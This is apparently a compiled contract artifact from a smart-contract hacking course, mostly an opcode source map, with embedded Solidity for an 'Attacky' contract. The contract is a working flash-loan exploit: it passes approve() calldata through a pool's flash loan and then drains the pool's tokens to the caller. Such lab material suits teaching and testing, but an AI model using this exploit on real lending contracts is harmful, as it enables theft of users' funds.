      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x51A"
    },
    "1248": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "1249": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1250": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1543
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "1283": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1285": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1287": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1289": {
      "op": "SHL"
    },
    "1290": {
      "op": "SUB"
    },
    "1291": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1553
      ],
      "op": "AND",
      "path": "14"
    },
    "1292": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1553
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1293": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1553
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x70A08231"
    },
    "1298": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1553
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "1299": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1301": {
      "op": "ADD"
    },
    "1302": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1537,
        1565
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x10F"
    },
    "1305": {
      "op": "JUMP"
    },
    "1306": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1504,
        1566
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "1307": {
      "fn": "Attacky.flashAttack",
      "offset": [
        737,
        1573
      ],
      "op": "POP",
      "path": "14"
    },
    "1308": {
      "fn": "Attacky.flashAttack",
      "offset": [
        737,
        1573
      ],
      "op": "POP",
      "path": "14"
    },
    "1309": {
      "fn": "Attacky.flashAttack",
      "offset": [
        737,
        1573
      ],
      "op": "POP",
      "path": "14"
    },
    "1310": {
      "fn": "Attacky.flashAttack",
      "offset": [
        737,
        1573
      ],
      "op": "POP",
      "path": "14"
    },
    "1311": {
      "fn": "Attacky.flashAttack",
      "jump": "o",
      "offset": [
        699,
        1573
      ],
      "op": "JUMP",
      "path": "14"
    },
    "1312": {
      "fn": "console.log",
      "offset": [
        5936,
        6072
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "1313": {
      "fn": "console.log",
      "offset": [
        5997,
        6068
      ],
      "op": "PUSH2",
      "path": "22",
      "statement": 5,
      "value": "0x565"
    },
    "1316": {
      "fn": "console.log",
      "offset": [
        6060,
        6062
      ],
      "op": "DUP3",
      "path": "22"
    },
    "1317": {
      "fn": "console.log",
      "offset": [
        6064,
        6066
      ],
      "op": "DUP3",
      "path": "22"
    },
    "1318": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "1320": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "1321": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x24"
    },
    "1323": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "ADD",
      "path": "22"
    },
    "1324": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x536"
    },
    "1327": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP3",
      "path": "22"
    },
    "1328": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "1329": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "1330": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x64E"
    },
    "1333": {
      "fn": "console.log",
      "jump": "i",
      "offset": [
        6013,
        6067
      ],
      "op": "JUMP",
      "path": "22"
    },
    "1334": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "1335": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x40"
    },
    "1337": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP1",
      "path": "22"
    },
    "1338": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "1339": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "1341": {
      "op": "NOT"
    },
    "1342": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP2",
      "path": "22"
    },
    "1343": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP5",
      "path": "22"
    },
    "1344": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SUB",
      "path": "22"
    },
    "1345": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "ADD",
      "path": "22"
    },
    "1346": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP2",
      "path": "22"
    },
    "1347": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "1348": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP2",
      "path": "22"
    },
    "1349": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "1350": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "1351": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x20"
    },
    "1353": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP2",
      "path": "22"
    },
    "1354": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "ADD",
      "path": "22"
    },
    "1355": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "DUP1",
      "path": "22"
    },
    "1356": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "1357": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1359": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1361": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1363": {
      "op": "SHL"
    },
    "1364": {
      "op": "SUB"
    },
    "1365": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "AND",
      "path": "22"
    },
    "1366": {
      "op": "PUSH4",
      "value": "0x2D839CB3"
    },
    "1371": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "1373": {
      "op": "SHL"
    },
    "1374": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "OR",
      "path": "22"
    },
    "1375": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "SWAP1",
      "path": "22"
    },
    "1376": {
      "fn": "console.log",
      "offset": [
        6013,
        6067
      ],
      "op": "MSTORE",
      "path": "22"
    },
    "1377": {
      "fn": "console.log",
      "offset": [
        5997,
        6012
      ],
      "op": "PUSH2",
      "path": "22",
      "value": "0x569"
    },
    "1380": {
      "fn": "console.log",
      "jump": "i",
      "offset": [
        5997,
        6068
      ],
      "op": "JUMP",
      "path": "22"
    },
    "1381": {
      "fn": "console.log",
      "offset": [
        5997,
        6068
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "1382": {
      "fn": "console.log",
      "offset": [
        5936,
        6072
      ],
      "op": "POP",
      "path": "22"
    },
    "1383": {
      "fn": "console.log",
      "offset": [
        5936,
        6072
      ],
      "op": "POP",
      "path": "22"
    },
    "1384": {
      "fn": "console.log",
      "jump": "o",
      "offset": [
        5936,
        6072
      ],
      "op": "JUMP",
      "path": "22"
    },
    "1385": {
      "fn": "console._sendLogPayload",
      "offset": [
        176,
        464
      ],
      "op": "JUMPDEST",
      "path": "22"
    },
    "1386": {
      "fn": "console._sendLogPayload",
      "offset": [
        264,
        278
      ],
      "op": "DUP1",
      "path": "22"
    },
    "1387": {
      "fn": "console._sendLogPayload",
      "offset": [
        264,
        278
      ],
      "op": "MLOAD",
      "path": "22"
    },
    "1388": {
      "offset": [
        129,
        171
      ],
      "op": "PUSH11",
      "path": "22",
      "value": "0x636F6E736F6C652E6C6F67"
    },
    "1400": {
      "fn": "console._sendLogPayload",
      "offset": [
        373,
        375
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x20"
    },
    "1402": {
      "fn": "console._sendLogPayload",
      "offset": [
        360,
        376
      ],
      "op": "DUP4",
      "path": "22"
    },
    "1403": {
      "fn": "console._sendLogPayload",
      "offset": [
        360,
        376
      ],
      "op": "ADD",
      "path": "22"
    },
    "1404": {
      "fn": "console._sendLogPayload",
      "offset": [
        240,
        261
      ],
      "op": "PUSH1",
      "path": "22",
      "value": "0x0"
    },
    "1406": {
      "fn": "console._sendLogPayload",
      "offset": [
        240,
        261
      ],
      "op": "DUP1",
      "path": "22"
    },
    "1407": {
      "fn": "console._sendLogPayload",
      "offset": [
        264,
        278
      ],
      "op": "DUP5",
      "path": "22"
    },
    "1408": {
      "fn": "console._sendLogPayload",
      "offset": [
        360,
        376
      ],
      "op": "DUP4",
      "path": "22"
    },
    "1409": {
      "offset": [
        129,
        171
      ],
      "op": "DUP6",
      "path": "22"
    },
    "1410": {
      "fn": "console._sendLogPayload",
      "offset": [
        400,
        405
      ],
      "op": "GAS",
      "path": "22"
    },
    "1411": {
      "fn": "console._sendLogPayload",
      "offset": [
        389,
        457
      ],
      "op": "STATICCALL",
      "path": "22"
    },
    "1412": {
      "fn": "console._sendLogPayload",
      "offset": [
        380,
        457
      ],
      "op": "POP",
      "path": "22"
    },
    "1413": {
      "fn": "console._sendLogPayload",
      "offset": [
        380,
        457
      ],
      "op": "POP",
      "path": "22"
    },
    "1414": {
      "fn": "console._sendLogPayload",
      "offset": [
        335,
        461
      ],
      "op": "POP",
      "path": "22"
    },
    "1415": {
      "fn": "console._sendLogPayload",
      "offset": [
        335,
        461
      ],
      "op": "POP",
      "path": "22"
    },
    "1416": {
      "fn": "console._sendLogPayload",
      "offset": [
        176,
        464
      ],
      "op": "POP",
      "path": "22"
    },
    "1417": {
      "fn": "console._sendLogPayload",
      "jump": "o",
      "offset": [
        176,
        464
      ],
      "op": "JUMP",
      "path": "22"
    },
    "1418": {
      "op": "JUMPDEST"
    },
    "1419": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1421": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1423": {
      "op": "DUP3"
    },
    "1424": {
      "op": "DUP5"
    },
    "1425": {
      "op": "SUB"
    },
    "1426": {
      "op": "SLT"
    },
    "1427": {
      "op": "ISZERO"
    },
    "1428": {
      "op": "PUSH2",
      "value": "0x59C"
    },
    "1431": {
      "op": "JUMPI"
    },
    "1432": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1434": {
      "op": "DUP1"
    },
    "1435": {
      "op": "REVERT"
    },
    "1436": {
      "op": "JUMPDEST"
    },
    "1437": {
      "op": "POP"
    },
    "1438": {
      "op": "MLOAD"
    },
    "1439": {
      "op": "SWAP2"
    },
    "1440": {
      "op": "SWAP1"
    },
    "1441": {
      "op": "POP"
    },
    "1442": {
      "jump": "o",
      "op": "JUMP"
    },
    "1443": {
      "op": "JUMPDEST"
    },
    "1444": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1446": {
      "op": "DUP2"
    },
    "1447": {
      "op": "MLOAD"
    },
    "1448": {
      "op": "DUP1"
    },
    "1449": {
      "op": "DUP5"
    },
    "1450": {
      "op": "MSTORE"
    },
    "1451": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1453": {
      "op": "JUMPDEST"
    },
    "1454": {
      "op": "DUP2"
    },
    "1455": {
      "op": "DUP2"
    },
    "1456": {
      "op": "LT"
    },
    "1457": {
      "op": "ISZERO"
    },
    "1458": {
      "op": "PUSH2",
      "value": "0x5C9"
    },
    "1461": {
      "op": "JUMPI"
    },
    "1462": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1464": {
      "op": "DUP2"
    },
    "1465": {
      "op": "DUP6"
    },
    "1466": {
      "op": "ADD"
    },
    "1467": {
      "op": "DUP2"
    },
    "1468": {
      "op": "ADD"
    },
    "1469": {
      "op": "MLOAD"
    },
    "1470": {
      "op": "DUP7"
    },
    "1471": {
      "op": "DUP4"
    },
    "1472": {
      "op": "ADD"
    },
    "1473": {
      "op": "DUP3"
    },
    "1474": {
      "op": "ADD"
    },
    "1475": {
      "op": "MSTORE"
    },
    "1476": {
      "op": "ADD"
    },
    "1477": {
      "op": "PUSH2",
      "value": "0x5AD"
    },
    "1480": {
      "op": "JUMP"
    },
    "1481": {
      "op": "JUMPDEST"
    },
    "1482": {
      "op": "POP"
    },
    "1483": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1485": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1487": {
      "op": "DUP3"
    },
    "1488": {
      "op": "DUP7"
    },
    "1489": {
      "op": "ADD"
    },
    "1490": {
      "op": "ADD"
    },
    "1491": {
      "op": "MSTORE"
    },
    "1492": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1494": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "1496": {
      "op": "NOT"
    },
    "1497": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "1499": {
      "op": "DUP4"
    },
    "1500": {
      "op": "ADD"
    },
    "1501": {
      "op": "AND"
    },
    "1502": {
      "op": "DUP6"
    },
    "1503": {
      "op": "ADD"
    },
    "1504": {
      "op": "ADD"
    },
    "1505": {
      "op": "SWAP2"
    },
    "1506": {
      "op": "POP"
    },
    "1507": {
      "op": "POP"
    },
    "1508": {
      "op": "SWAP3"
    },
    "1509": {
      "op": "SWAP2"
    },
    "1510": {
      "op": "POP"
    },
    "1511": {
      "op": "POP"
    },
    "1512": {
      "jump": "o",
      "op": "JUMP"
    },
    "1513": {
      "op": "JUMPDEST"
    },
    "1514": {
      "op": "DUP5"
    },
    "1515": {
      "op": "DUP2"
    },
    "1516": {
      "op": "MSTORE"
    },
    "1517": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1519": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1521": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1523": {
      "op": "SHL"
    },
    "1524": {
      "op": "SUB"
    },
    "1525": {
      "op": "DUP5"
    },
    "1526": {
      "op": "DUP2"
    },
    "1527": {
      "op": "AND"
    },
    "1528": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1530": {
      "op": "DUP4"
    },
    "1531": {
      "op": "ADD"
    },
    "1532": {
      "op": "MSTORE"
    },
    "1533": {
      "op": "DUP4"
    },
    "1534": {
      "op": "AND"
    },
    "1535": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1537": {
      "op": "DUP3"
    },
    "1538": {
      "op": "ADD"
    },
    "1539": {
      "op": "MSTORE"
    },
    "1540": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "1542": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "1544": {
      "op": "DUP3"
    },
    "1545": {
      "op": "ADD"
    },
    "1546": {
      "op": "DUP2"
    },
    "1547": {
      "op": "SWAP1"
    },
    "1548": {
      "op": "MSTORE"
    },
    "1549": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1551": {
      "op": "SWAP1"
    },
    "1552": {
      "op": "PUSH2",
      "value": "0x61B"
    },
    "1555": {
      "op": "SWAP1"
    },
    "1556": {
      "op": "DUP4"
    },
    "1557": {
      "op": "ADD"
    },
    "1558": {
      "op": "DUP5"
    },
    "1559": {
      "op": "PUSH2",
      "value": "0x5A3"
    },
    "1562": {
      "jump": "i",
      "op": "JUMP"
    },
    "1563": {
      "op": "JUMPDEST"
    },
    "1564": {
      "op": "SWAP7"
    },
    "1565": {
      "op": "SWAP6"
    },
    "1566": {
      "op": "POP"
    },
    "1567": {
      "op": "POP"
    },
    "1568": {
      "op": "POP"
    },
    "1569": {
      "op": "POP"
    },
    "1570": {
      "op": "POP"
    },
    "1571": {
      "op": "POP"
    },
    "1572": {
      "jump": "o",
      "op": "JUMP"
    },
    "1573": {
      "op": "JUMPDEST"
    },
    "1574": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1576": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1578": {
      "op": "DUP3"
    },
    "1579": {
      "op": "DUP5"
    },
    "1580": {
      "op": "SUB"
    },
    "1581": {
      "op": "SLT"
    },
    "1582": {
      "op": "ISZERO"
    },
    "1583": {
      "op": "PUSH2",
      "value": "0x637"
    },
    "1586": {
      "op": "JUMPI"
    },
    "1587": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1589": {
      "op": "DUP1"
    },
    "1590": {
      "op": "REVERT"
    },
    "1591": {
      "op": "JUMPDEST"
    },
    "1592": {
      "op": "DUP2"
    },
    "1593": {
      "op": "MLOAD"
    },
    "1594": {
      "op": "DUP1"
    },
    "1595": {
      "op": "ISZERO"
    },
    "1596": {
      "op": "ISZERO"
    },
    "1597": {
      "op": "DUP2"
    },
    "1598": {
      "op": "EQ"
    },
    "1599": {
      "op": "PUSH2",
      "value": "0x647"
    },
    "1602": {
      "op": "JUMPI"
    },
    "1603": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1605": {
      "op": "DUP1"
    },
    "1606": {
      "op": "REVERT"
    },
    "1607": {
      "op": "JUMPDEST"
    },
    "1608": {
      "op": "SWAP4"
    },
    "1609": {
      "op": "SWAP3"
    },
    "1610": {
      "op": "POP"
    },
    "1611": {
      "op": "POP"
    },
    "1612": {
      "op": "POP"
    },
    "1613": {
      "jump": "o",
      "op": "JUMP"
    },
    "1614": {
      "op": "JUMPDEST"
    },
    "1615": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1617": {
      "op": "DUP2"
    },
    "1618": {
      "op": "MSTORE"
    },
    "1619": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1621": {
      "op": "PUSH2",
      "value": "0x661"
    },
    "1624": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1626": {
      "op": "DUP4"
    },
    "1627": {
      "op": "ADD"
    },
    "1628": {
      "op": "DUP6"
    },
    "1629": {
      "op": "PUSH2",
      "value": "0x5A3"
    },
    "1632": {
      "jump": "i",
      "op": "JUMP"
    },
    "1633": {
      "op": "JUMPDEST"
    },
    "1634": {
      "op": "SWAP1"
    },
    "1635": {
      "op": "POP"
    },
    "1636": {
      "op": "DUP3"
    },
    "1637": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1639": {
      "op": "DUP4"
    },
    "1640": {
      "op": "ADD"
    },
    "1641": {
      "op": "MSTORE"
    },
    "1642": {
      "op": "SWAP4"
    },
    "1643": {
      "op": "SWAP3"
    },
    "1644": {
      "op": "POP"
    },
    "1645": {
      "op": "POP"
    },
    "1646": {
      "op": "POP"
    },
    "1647": {
      "jump": "o",
      "op": "JUMP"
    }
  },
  "sha1": "a03cb73f94badcc8721ca5f368dc2994dd80657c",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"./Pool.sol\";\nimport \"hardhat/console.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n/*\n * @title Pool\n * @author JohnnyTime (https://smartcontractshacking.com)\n */\ncontract Attacky  {\n\n    using Address for address;\n\n    Pool immutable pool;\n    IERC20 immutable tokenz;\n    address public poolAddress;\n    constructor (address _poolAddress) payable {\n        poolAddress = _poolAddress;\n        pool = Pool(poolAddress);\n        tokenz = IERC20(address(pool.token()));\n    }\n\n    function flashAttack(\n\n    ) external {\n        console.log(\"Pool balance BEFORE: \",tokenz.balanceOf(address(pool)));\n        uint256 amount = 0;\n        address borrower = address(this);\n        address target = address(tokenz);\n        bytes memory data = abi.encodeWithSignature(\"approve(address,uint256)\", address(this), tokenz.balanceOf(address(pool)));\n        pool.requestFlashLoan(amount, borrower, target, data);\n\n        \n        tokenz.transferFrom(address(pool), msg.sender, tokenz.balanceOf(address(pool)));\n        console.log(\"Pool balance AFTER: \",tokenz.balanceOf(address(pool)));\n        //bytes memory data2 = abi.encodeWithSignature(\"transfer(address,uint256)\", address(this), tokenz.balanceOf(address(pool)));\n        //pool.requestFlashLoan(amount, borrower, target, data2);\n        console.log(\"Attacker balance: \",tokenz.balanceOf(msg.sender));\n    }\n\n}\n",
  "sourceMap": "382:1194:14:-:0;;;525:168;;;;;;;;;;;;;;;;;;:::i;:::-;578:11;:26;;-1:-1:-1;;;;;;578:26:14;-1:-1:-1;;;;;578:26:14;;;;;;;;614:24;;;;672:12;;;-1:-1:-1;;;672:12:14;;;;:10;;:12;;;;;;;;;;;;;;;578:26;672:12;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;-1:-1:-1;;;;;648:38:14;;;-1:-1:-1;382:1194:14;;14:131:23;-1:-1:-1;;;;;89:31:23;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:251::-;220:6;273:2;261:9;252:7;248:23;244:32;241:52;;;289:1;286;279:12;241:52;321:9;315:16;340:31;365:5;340:31;:::i;:::-;390:5;150:251;-1:-1:-1;;;150:251:23:o;406:266::-;382:1194:14;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/flash-loan-attacks-1/flashAttack.sol",
  "type": "contract"
}